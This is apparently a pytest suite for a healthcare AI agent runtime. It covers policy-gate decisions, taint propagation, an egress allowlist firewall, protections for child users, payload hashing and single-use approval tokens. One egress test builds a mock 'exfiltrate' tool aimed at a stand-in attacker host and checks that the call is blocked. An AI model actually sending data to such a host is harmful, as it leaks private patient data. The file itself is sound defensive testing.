# Carefold — Healthcare AI Agent Marketplace & Runtime
# Copyright 2026 Spectrayan (https://spectrayan.com)
#
# Licensed under the PolyForm Noncommercial License 1.0.0 and the
# Carefold Additional Terms (see LICENSE and ADDITIONAL-TERMS.md).
# Personal and household local use only. Commercial use, hosted service
# offering, rebranding, white-labeling, and redistribution of modified
# forks are prohibited without a written commercial license from Spectrayan.
#
# Required Notice: Copyright 2026 Spectrayan (https://spectrayan.com)

"""Comprehensive unit test suite for Carefold Policy Gate, Monotone Taint, and HITL Resumption.

Tests 100% of the policy gate truth-table paths:
- 4 tiers (read, write_local, write_external, irreversible)
- 3 autonomy levels (A0, A1, A2)
- 2 taint states (clean / False, tainted / True)
- 3 age bands (adult, teen, child_under_13)
- 2 consent states (unconsented / False, consented / True)
Total: 4 × 3 × 2 × 3 × 2 = 144 matrix combinations.

Also covers:
- Egress firewall allowlisting and zero-byte blocking (EgressBlockedError)
- Monotone taint propagation (irreversible set(), untrusted tool outputs)
- Child under 13 protective boundaries
- RFC-8785 canonical JSON serialization & payload hashing
- Single-use approval tokens and atomic SQL resumption
"""

from __future__ import annotations

import asyncio
from dataclasses import FrozenInstanceError, dataclass
import inspect
import itertools
import json
import time
from typing import Any, Dict, List, Literal, Mapping, Optional, Sequence
import pytest

# Dynamic import with fallback to specification contracts shim
try:
    from carefold.engine.tool_exec import (  # type: ignore
        EgressBlockedError,
        PolicyDecision,
        RiskTier,
        TaintFlag,
        ToolContext,
        ToolSpec,
        TrustLevel,
        UntrustedResult,
        canonical_json,
        compute_payload_hash,
        evaluate_policy_gate,
        execute_tool_call,
    )
except ImportError:
    from tests.e2e_autonomy.contracts import (  # type: ignore
        EgressBlockedError,
        PolicyDecision,
        RiskTier,
        TaintFlag,
        ToolContext,
        ToolSpec,
        TrustLevel,
        UntrustedResult as _ContractUntrustedResult,
        canonical_json,
        compute_payload_hash,
        evaluate_policy_gate,
        execute_tool_call,
    )

    # Compatible UntrustedResult supporting taint: bool = True
    if "taint" in inspect.signature(_ContractUntrustedResult).parameters:
        UntrustedResult = _ContractUntrustedResult  # type: ignore
    else:
        class UntrustedResult(_ContractUntrustedResult):  # type: ignore
            """Wrapper marking tool output as untrusted, triggering monotone taint propagation."""
            def __init__(self, data: Any, taint: bool = True, source: str = "external") -> None:
                super().__init__(data=data, source=source)
                self.taint = bool(taint)


# ============================================================================
# Canonical Policy Gate Oracle for 100% Truth Table Verification
# ============================================================================

def canonical_oracle_decision(
    risk_tier: str,
    autonomy: str,
    tainted: bool,
    age_band: str,
    consent: bool,
) -> str:
    """Deterministic mathematical oracle implementing AU-17 policy specification.

    Evaluation precedence:
    1. Read tier is always ALLOWED across all contexts.
    2. Child under 13:
       - write_external is strictly BLOCKED.
       - write_local requires guardian consent (NEEDS_APPROVAL if unconsented).
    3. Irreversible actions always require human approval (NEEDS_APPROVAL).
    4. Monotone taint: tainted context forces approval on write_external (NEEDS_APPROVAL).
    5. Autonomy matrix:
       - A0: all writes require approval (NEEDS_APPROVAL).
       - A1: write_local allowed (ALLOW); write_external requires approval (NEEDS_APPROVAL).
       - A2: write_local allowed (ALLOW); write_external requires consent (ALLOW if consented, else NEEDS_APPROVAL).
    """
    # 1. Read is universally allowed
    if risk_tier == "read":
        return "allow"

    # 2. Child under 13 safety boundary
    if age_band == "child_under_13":
        if risk_tier == "write_external":
            return "blocked"
        if risk_tier == "write_local" and not consent:
            return "needs_approval"

    # 3. Irreversible actions always require human approval
    if risk_tier == "irreversible":
        return "needs_approval"

    # 4. Monotone taint escalation forces approval on external writes
    if tainted and risk_tier == "write_external":
        return "needs_approval"

    # 5. Autonomy level matrix (A0 / A1 / A2)
    if autonomy == "A0":
        return "needs_approval"

    if autonomy == "A1":
        if risk_tier == "write_external":
            return "needs_approval"
        if risk_tier == "write_local":
            return "allow"

    if autonomy == "A2":
        if risk_tier == "write_local":
            return "allow"
        if risk_tier == "write_external":
            return "allow" if consent else "needs_approval"

    return "allow"


# ============================================================================
# Test Fixtures
# ============================================================================

@pytest.fixture
def make_context():
    """Factory fixture generating valid ToolContext instances."""
    def _factory(
        autonomy: str = "A1",
        tainted: bool = False,
        user_id: str = "test-user-001",
        profile_id: str = "test-profile-001",
        principal: str = "user",
    ) -> ToolContext:
        flag = TaintFlag(initial=tainted)
        return ToolContext(
            user_id=user_id,
            profile_id=profile_id,
            principal=principal,  # type: ignore[arg-type]
            autonomy=autonomy,  # type: ignore[arg-type]
            taint=flag,
        )
    return _factory


# ============================================================================
# 1. Full Truth Table Matrix Tests (144 Combinations)
# ============================================================================

ALL_TIERS = ["read", "write_local", "write_external", "irreversible"]
ALL_AUTONOMIES = ["A0", "A1", "A2"]
ALL_TAINTS = [False, True]
ALL_AGE_BANDS = ["adult", "teen", "child_under_13"]
ALL_CONSENTS = [False, True]

TRUTH_TABLE_COMBINATIONS = list(
    itertools.product(ALL_TIERS, ALL_AUTONOMIES, ALL_TAINTS, ALL_AGE_BANDS, ALL_CONSENTS)
)


class TestPolicyGateTruthTableMatrix:
    """Verifies 100% of the policy gate truth table (144 parameter combinations)."""

    @pytest.mark.parametrize(
        "risk_tier,autonomy,tainted,age_band,consent",
        TRUTH_TABLE_COMBINATIONS,
        ids=[
            f"{t}_{a}_{'tainted' if s else 'clean'}_{age}_{'consented' if c else 'unconsented'}"
            for t, a, s, age, c in TRUTH_TABLE_COMBINATIONS
        ],
    )
    def test_truth_table_all_144_combinations(
        self,
        make_context,
        risk_tier: str,
        autonomy: str,
        tainted: bool,
        age_band: str,
        consent: bool,
    ):
        """Asserts policy gate evaluation exactly matches the canonical specification."""
        ctx = make_context(autonomy=autonomy, tainted=tainted)
        spec = ToolSpec(
            name=f"test_tool_{risk_tier}",
            description="Truth table test tool",
            parameters={},
            risk_tier=risk_tier,  # type: ignore[arg-type]
        )
        consents = {
            "external_write_consent": consent,
            "guardian_consent": consent,
        }

        decision = evaluate_policy_gate(
            ctx=ctx,
            spec=spec,
            args={},
            consents=consents,
            age_band=age_band,
        )

        expected = canonical_oracle_decision(
            risk_tier=risk_tier,
            autonomy=autonomy,
            tainted=tainted,
            age_band=age_band,
            consent=consent,
        )

        assert decision.decision == expected, (
            f"Policy gate decision mismatch for ({risk_tier}, {autonomy}, "
            f"tainted={tainted}, {age_band}, consent={consent}): "
            f"expected '{expected}', got '{decision.decision}' (reason: {decision.reason})"
        )


# ============================================================================
# 2. Monotone Taint Propagation & Escalation Tests (AU-19)
# ============================================================================

class TestMonotoneTaintPropagation:
    """Verifies monotone taint propagation, UntrustedResult wrapper, and escalation."""

    def test_taint_flag_initial_clean_state(self):
        """Initial TaintFlag state must be clean (False)."""
        flag = TaintFlag(initial=False)
        assert flag.is_tainted is False
        assert bool(flag) is False

    def test_taint_flag_set_is_strictly_monotone(self):
        """Once set to True, TaintFlag can never revert to False."""
        flag = TaintFlag(initial=False)
        flag.set()
        assert flag.is_tainted is True
        assert bool(flag) is True

        # Repeated invocations are strictly idempotent
        flag.set()
        flag.set()
        assert flag.is_tainted is True
        assert bool(flag) is True

    def test_taint_flag_has_no_clear_or_reset_method(self):
        """Guarantees through reflection that no reset or clear method exists."""
        flag = TaintFlag()
        assert not hasattr(flag, "clear")
        assert not hasattr(flag, "reset")
        assert not hasattr(flag, "revert")

    def test_untrusted_result_wrapper_dataclass_contract(self):
        """UntrustedResult correctly captures payload, taint status, and source."""
        payload = {"articles": ["Clinical Study A", "Trial B"]}
        wrapper = UntrustedResult(data=payload, taint=True, source="web_search")
        assert wrapper.data == payload
        assert wrapper.taint is True
        assert wrapper.source == "web_search"

    @pytest.mark.asyncio
    async def test_tool_returning_untrusted_result_mutates_context_taint(self, make_context):
        """Tool returning UntrustedResult mutates ToolContext taint to True."""
        ctx = make_context(autonomy="A1", tainted=False)
        assert ctx.taint.is_tainted is False

        spec = ToolSpec(
            name="search_pubmed",
            risk_tier="read",
            executor=lambda args: UntrustedResult(data="Hypertension study text", source="pubmed"),
        )
        res = await execute_tool_call(ctx, spec, {"term": "lisinopril"})
        assert res.success is True
        assert ctx.taint.is_tainted is True

    @pytest.mark.asyncio
    async def test_tool_spec_with_untrusted_trust_level_mutates_context_taint(self, make_context):
        """Tool declared with trust='untrusted' sets context taint even on raw dict return."""
        ctx = make_context(autonomy="A1", tainted=False)
        assert ctx.taint.is_tainted is False

        spec = ToolSpec(
            name="scrape_portal",
            risk_tier="read",
            trust="untrusted",
            executor=lambda args: {"raw_html": "<p>Medical note</p>"},
        )
        res = await execute_tool_call(ctx, spec, {"url": "https://portal.clinic.org"})
        assert res.success is True
        assert ctx.taint.is_tainted is True

    def test_taint_escalation_clean_vs_tainted_forces_approval_in_a2(self, make_context):
        """A2 autonomy with consent: clean run allows external write; tainted run forces approval."""
        ctx_clean = make_context(autonomy="A2", tainted=False)
        ctx_tainted = make_context(autonomy="A2", tainted=True)

        spec = ToolSpec(name="sync_external_records", risk_tier="write_external")
        consents = {"external_write_consent": True}

        # Clean run is permitted under A2 + consent
        dec_clean = evaluate_policy_gate(ctx_clean, spec, {}, consents=consents)
        assert dec_clean.decision == "allow"

        # Tainted run MUST force approval regardless of A2 autonomy and consent
        dec_tainted = evaluate_policy_gate(ctx_tainted, spec, {}, consents=consents)
        assert dec_tainted.decision == "needs_approval"
        assert "FORCED APPROVAL" in dec_tainted.reason or "tainted" in dec_tainted.reason.lower()

    @pytest.mark.asyncio
    async def test_taint_persists_monotonically_across_sequential_tool_invocations(self, make_context):
        """Sequential tool calls: untrusted tool sets taint, subsequent external tool requires approval."""
        ctx = make_context(autonomy="A2", tainted=False)
        consents = {"external_write_consent": True}

        # Step 1: Execute untrusted tool
        t1 = ToolSpec(
            name="download_ehr",
            risk_tier="read",
            trust="untrusted",
            executor=lambda args: UntrustedResult(data="Remote EHR content"),
        )
        r1 = await execute_tool_call(ctx, t1, {})
        assert r1.success is True
        assert ctx.taint.is_tainted is True

        # Step 2: Attempt external write with consent under A2
        t2 = ToolSpec(
            name="calendar_sync",
            risk_tier="write_external",
            data_flows=("cal.google.com",),
            executor=lambda args: {"synced": True},
        )
        r2 = await execute_tool_call(
            ctx,
            t2,
            {"endpoint": "https://cal.google.com/events"},
            consents=consents,
        )
        assert r2.success is False
        assert r2.needs_approval is True
        assert "ApprovalRequired" in (r2.error or "")


# ============================================================================
# 3. Egress Firewall & Host Allowlisting Tests (AU-17 & AU-20)
# ============================================================================

class TestEgressFirewall:
    """Verifies strict outbound network allowlisting and zero-byte blocking."""

    @pytest.mark.asyncio
    async def test_authorized_destination_host_passes_egress_check(self, make_context):
        """Network request to an allowlisted host passes firewall check."""
        ctx = make_context(autonomy="A1")
        executed = False

        async def _mock_api(args):
            nonlocal executed
            executed = True
            return {"status": "ok"}

        spec = ToolSpec(
            name="fetch_fhir_records",
            risk_tier="read",
            data_flows=("fhir.hospital.org",),
            executor=_mock_api,
        )
        res = await execute_tool_call(
            ctx, spec, {"url": "https://fhir.hospital.org/v2/Patient/101"}
        )
        assert res.success is True
        assert executed is True

    @pytest.mark.asyncio
    async def test_unauthorized_destination_host_fails_closed_zero_bytes_sent(self, make_context):
        """Network request to unallowlisted host is blocked with zero network bytes sent."""
        ctx = make_context(autonomy="A2")
        executed = False

        async def _mock_exfiltrate(args):
            nonlocal executed
            executed = True
            return {"leaked": True}

        spec = ToolSpec(
            name="fhir_client",
            risk_tier="read",
            data_flows=("fhir.hospital.org",),
            executor=_mock_exfiltrate,
        )
        res = await execute_tool_call(
            ctx, spec, {"url": "https://evil-exfiltration-server.attacker.net/leak"}
        )
        assert res.success is False
        assert executed is False  # Zero bytes sent: executor was never invoked
        assert "EgressBlockedError" in (res.error or "") or "denied" in (res.error or "").lower()

    @pytest.mark.asyncio
    async def test_external_tool_with_empty_data_flows_fails_closed(self, make_context):
        """write_external tool with empty data_flows allowlist blocks all outbound requests."""
        ctx = make_context(autonomy="A2")
        spec = ToolSpec(
            name="unconfigured_connector",
            risk_tier="write_external",
            data_flows=(),  # No allowed hosts configured
            executor=lambda args: {"sent": True},
        )
        res = await execute_tool_call(ctx, spec, {"endpoint": "https://api.thirdparty.com"})
        assert res.success is False
        assert "EgressBlockedError" in (res.error or "") or "no authorized data_flows" in (res.error or "")

    @pytest.mark.asyncio
    @pytest.mark.parametrize("key", ["url", "endpoint", "host", "target_url", "base_url"])
    async def test_all_url_parameter_keys_are_firewalled(self, make_context, key: str):
        """All standard target URL argument keys are intercepted and checked by firewall."""
        ctx = make_context(autonomy="A2")
        spec = ToolSpec(
            name="webhook_sender",
            risk_tier="read",
            data_flows=("trusted.partner.org",),
            executor=lambda args: {"ok": True},
        )
        res = await execute_tool_call(ctx, spec, {key: "https://unauthorized.target.org/hook"})
        assert res.success is False
        assert "EgressBlockedError" in (res.error or "") or "denied" in (res.error or "").lower()

    @pytest.mark.asyncio
    async def test_port_stripping_and_hostname_normalization(self, make_context):
        """URLs with custom ports are normalized to hostnames for allowlist matching."""
        ctx = make_context(autonomy="A1")
        spec = ToolSpec(
            name="internal_service",
            risk_tier="read",
            data_flows=("vault.internal.net",),
            executor=lambda args: {"token": "secret"},
        )
        res = await execute_tool_call(
            ctx, spec, {"url": "https://vault.internal.net:8443/v1/auth"}
        )
        assert res.success is True


# ============================================================================
# 4. Child Under 13 Safety Boundary Tests
# ============================================================================

class TestChildUnder13Protections:
    """Verifies strict child safety boundaries for COPPA and clinical governance."""

    @pytest.mark.parametrize("autonomy", ["A0", "A1", "A2"])
    @pytest.mark.parametrize("tainted", [False, True])
    @pytest.mark.parametrize("consent", [False, True])
    def test_child_under_13_write_external_strictly_blocked(
        self, make_context, autonomy: str, tainted: bool, consent: bool
    ):
        """Child under 13 external writes are strictly BLOCKED under all autonomy levels, taint, and consent."""
        ctx = make_context(autonomy=autonomy, tainted=tainted)
        spec = ToolSpec(name="post_social", risk_tier="write_external")
        consents = {"external_write_consent": consent}

        decision = evaluate_policy_gate(
            ctx, spec, {}, consents=consents, age_band="child_under_13"
        )
        assert decision.decision == "blocked"
        assert "Child under 13" in decision.reason

    def test_child_under_13_write_local_without_guardian_consent_needs_approval(self, make_context):
        """Child under 13 write_local requires guardian consent; needs_approval if unconsented."""
        ctx = make_context(autonomy="A2")
        spec = ToolSpec(name="save_journal", risk_tier="write_local")

        decision = evaluate_policy_gate(
            ctx, spec, {}, consents={"guardian_consent": False}, age_band="child_under_13"
        )
        assert decision.decision == "needs_approval"
        assert "Guardian consent required" in decision.reason

    def test_child_under_13_write_local_with_guardian_consent_a1_a2_allowed(self, make_context):
        """Child under 13 write_local with guardian consent is allowed under A1 and A2."""
        for auto in ("A1", "A2"):
            ctx = make_context(autonomy=auto)
            spec = ToolSpec(name="save_journal", risk_tier="write_local")

            decision = evaluate_policy_gate(
                ctx, spec, {}, consents={"guardian_consent": True}, age_band="child_under_13"
            )
            assert decision.decision == "allow"

    def test_child_under_13_read_allowed(self, make_context):
        """Child under 13 read-only tools are allowed across all autonomy levels."""
        for auto in ("A0", "A1", "A2"):
            ctx = make_context(autonomy=auto)
            spec = ToolSpec(name="view_storybook", risk_tier="read")

            decision = evaluate_policy_gate(
                ctx, spec, {}, age_band="child_under_13"
            )
            assert decision.decision == "allow"

    def test_teen_and_adult_not_subject_to_child_block(self, make_context):
        """Teen and adult profiles are not subjected to the child under 13 external write block."""
        for age in ("teen", "adult"):
            ctx = make_context(autonomy="A2")
            spec = ToolSpec(name="send_email", risk_tier="write_external")

            decision = evaluate_policy_gate(
                ctx, spec, {}, consents={"external_write_consent": True}, age_band=age
            )
            assert decision.decision == "allow"


# ============================================================================
# 5. Canonical JSON Serialization & SHA-256 Hashing Tests (AU-18)
# ============================================================================

class TestCanonicalJsonPayloadHashing:
    """Verifies RFC-8785 canonical JSON serialization and deterministic hashing."""

    def test_canonical_json_key_order_independence(self):
        """Key ordering in dictionaries does not affect canonical JSON output."""
        d1 = {"zebra": 1, "apple": 2, "mango": 3}
        d2 = {"apple": 2, "mango": 3, "zebra": 1}
        assert canonical_json(d1) == canonical_json(d2)
        assert canonical_json(d1) == '{"apple":2,"mango":3,"zebra":1}'

    def test_canonical_json_compact_separators(self):
        """Canonical JSON contains no unnecessary whitespace separators."""
        data = {"key": "value", "list": [1, 2, 3]}
        raw = canonical_json(data)
        assert ", " not in raw
        assert ": " not in raw
        assert raw == '{"key":"value","list":[1,2,3]}'

    def test_compute_payload_hash_deterministic_sha256(self):
        """Payload hash produces deterministic 64-character lowercase hexadecimal digest."""
        args1 = {"dosage": "10mg", "medication": "lisinopril", "patient_id": "P-99"}
        args2 = {"patient_id": "P-99", "medication": "lisinopril", "dosage": "10mg"}

        h1 = compute_payload_hash(args1)
        h2 = compute_payload_hash(args2)
        assert h1 == h2
        assert len(h1) == 64
        assert all(c in "0123456789abcdef" for c in h1)

    def test_compute_payload_hash_argument_tampering_changes_hash(self):
        """Altering any argument value immediately changes the payload hash."""
        args_original = {"dosage": "10mg", "patient_id": "P-99"}
        args_tampered = {"dosage": "100mg", "patient_id": "P-99"}
        assert compute_payload_hash(args_original) != compute_payload_hash(args_tampered)


# ============================================================================
# 6. Single-Use Approval Token & Atomic Resumption Tests (AU-18)
# ============================================================================

class TestApprovalTokenAtomicResume:
    """Verifies single-use approval token lifecycle and atomic resume semantics."""

    def test_approval_record_pending_has_valid_payload_hash(self):
        """Creating an approval record computes and stores canonical payload hash."""
        from tests.e2e_autonomy.contracts import ApprovalStore  # type: ignore

        store = ApprovalStore()
        args = {"recipient": "pharmacy@care.org", "prescription_id": "RX-400"}
        rec = store.create_pending(
            approval_id="app-unit-01",
            profile_id="prof-10",
            run_id="run-10",
            tool_name="send_rx",
            args=args,
            risk_tier="write_external",
            destination_hosts=["pharmacy@care.org"],
        )
        assert rec.status == "pending"
        assert rec.payload_hash == compute_payload_hash(args)

    def test_atomic_consume_matching_args_succeeds_and_marks_consumed(self):
        """Consuming approval with matching arguments transitions status to 'consumed'."""
        from tests.e2e_autonomy.contracts import ApprovalStore  # type: ignore

        store = ApprovalStore()
        args = {"action": "cancel_appointment", "appt_id": "APT-12"}
        store.create_pending(
            approval_id="app-unit-02",
            profile_id="prof-10",
            run_id="run-10",
            tool_name="cancel_appt",
            args=args,
            risk_tier="irreversible",
        )
        store.decide("app-unit-02", "prof-10", "approved", None, "user-admin", ["manage"])

        # Atomic consume with identical args
        consumed_id = store.consume_atomic("app-unit-02", args)
        assert consumed_id == "app-unit-02"

        # Record is now consumed
        rec = store._records["app-unit-02"]
        assert rec.status == "consumed"

    def test_atomic_consume_tampered_args_fails_closed(self):
        """Attempting to resume with arguments differing from reviewed ones fails closed."""
        from tests.e2e_autonomy.contracts import ApprovalStore  # type: ignore

        store = ApprovalStore()
        args_approved = {"action": "refill", "qty": 30}
        args_tampered = {"action": "refill", "qty": 300}

        store.create_pending(
            approval_id="app-unit-03",
            profile_id="prof-10",
            run_id="run-10",
            tool_name="order_refill",
            args=args_approved,
            risk_tier="write_external",
        )
        store.decide("app-unit-03", "prof-10", "approved", None, "user-admin", ["manage"])

        with pytest.raises(ValueError, match="Payload hash mismatch"):
            store.consume_atomic("app-unit-03", args_tampered)

    def test_atomic_consume_double_spend_fails_closed(self):
        """Attempting to consume an already consumed approval token fails closed."""
        from tests.e2e_autonomy.contracts import ApprovalStore  # type: ignore

        store = ApprovalStore()
        args = {"dose": "5mg"}
        store.create_pending("app-unit-04", "prof-10", "run-10", "set_dose", args, "write_local")
        store.decide("app-unit-04", "prof-10", "approved", None, "user-admin", ["manage"])

        # First consumption succeeds
        store.consume_atomic("app-unit-04", args)

        # Second consumption (replay attack) fails closed
        with pytest.raises(ValueError, match="cannot consume"):
            store.consume_atomic("app-unit-04", args)

    def test_atomic_consume_rejected_or_expired_token_fails_closed(self):
        """Attempting to consume a rejected token fails closed."""
        from tests.e2e_autonomy.contracts import ApprovalStore  # type: ignore

        store = ApprovalStore()
        args = {"dose": "5mg"}
        store.create_pending("app-unit-05", "prof-10", "run-10", "set_dose", args, "write_local")
        store.decide("app-unit-05", "prof-10", "rejected", None, "user-admin", ["manage"])

        with pytest.raises(ValueError, match="cannot consume"):
            store.consume_atomic("app-unit-05", args)


# ============================================================================
# 7. Fail-Closed Invariants & Immutability Tests
# ============================================================================

class TestFailClosedInvariants:
    """Verifies fail-closed context construction and immutability invariants."""

    def test_tool_context_missing_or_empty_profile_id_raises(self):
        """ToolContext requires non-empty profile_id (fail-closed)."""
        with pytest.raises(ValueError, match="profile_id"):
            ToolContext(user_id="user-1", profile_id="")

    def test_tool_context_missing_or_empty_user_id_raises(self):
        """ToolContext requires non-empty user_id (fail-closed)."""
        with pytest.raises(ValueError, match="user_id"):
            ToolContext(user_id="", profile_id="prof-1")

    def test_tool_context_frozen_instance_immutability(self):
        """ToolContext attributes cannot be mutated after instantiation."""
        ctx = ToolContext(user_id="user-1", profile_id="prof-1", autonomy="A1")
        with pytest.raises(FrozenInstanceError):
            ctx.autonomy = "A2"  # type: ignore[misc]
